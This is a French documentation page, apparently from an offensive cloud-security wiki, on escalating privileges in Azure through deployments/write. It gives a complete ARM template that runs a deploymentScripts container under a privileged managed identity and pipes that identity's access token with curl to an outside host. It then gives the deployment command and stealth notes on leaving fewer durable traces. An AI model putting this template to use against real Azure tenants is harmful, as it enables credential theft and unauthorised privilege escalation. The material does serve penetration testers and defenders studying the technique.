---
title: "Modèle de déploiement : s'exécuter sous une identité privilégiée via un déploiement ARM"
order: 5
description: "Déployer un modèle ARM ou une ressource deploymentScripts qui s'exécute sous une identité managée privilégiée via Microsoft.Resources/deployments/write."
keywords:
  - modèle ARM
  - deployments write
  - deploymentScripts
  - identité managée
  - élévation de privilèges
---

# Modèle de déploiement

`Microsoft.Resources/deployments/write` permet de soumettre un modèle ARM à un groupe de ressources. Deux formes d'escalade en découlent : déployer une ressource qui porte une identité managée privilégiée puis l'emprunter, ou déployer une ressource **deploymentScripts**, qui exécute un script arbitraire dans un conteneur sous une identité user-assigned que vous désignez (la technique `Invoke-AzureDeploymentScript` de MicroBurst).

## deploymentScripts s'exécutant sous une identité choisie

```bash
cat > ds.json <<'EOF'
{ "$schema":"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion":"1.0.0.0",
  "resources":[{
    "type":"Microsoft.Resources/deploymentScripts","apiVersion":"2020-10-01",
    "name":"x","location":"eastus","kind":"AzureCLI",
    "identity":{"type":"UserAssigned","userAssignedIdentities":{"<privileged-uami-resource-id>":{}}},
    "properties":{"azCliVersion":"2.52.0","retentionInterval":"PT1H",
      "scriptContent":"az account get-access-token --resource https://management.azure.com/ | curl -s -X POST -d @- https://you.example"}}]}
EOF
az deployment group create -g <rg> --template-file ds.json
```

Le script s'exécute sous l'identité désignée et exfiltre son token ARM.

## Notes d'exploitation

- `deploymentScripts` est la primitive la plus propre : elle ne nécessite que `deployments/write` et le droit d'utiliser l'identité user-assigned, et laisse un conteneur éphémère plutôt qu'une ressource permanente.
- Déployer une VM ou une Function avec une identité system-assigned fonctionne aussi, mais crée des ressources durables, plus faciles à repérer.
- Les déploiements s'exécutent par défaut au scope du groupe de ressources ; `deployments/write` au scope de l'abonnement élargit le rayon d'action.

## Outils

- **az cli** (`az deployment group create`).
- **MicroBurst** (`Invoke-AzureDeploymentScript`).

## Références

- [NetSPI : maintenir l'accès avec deploymentScripts](https://www.netspi.com/blog/technical-blog/)
- [Microsoft : scripts de déploiement ARM](https://learn.microsoft.com/azure/azure-resource-manager/templates/deployment-script-template)
- [HackTricks Cloud : élévation de privilèges Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
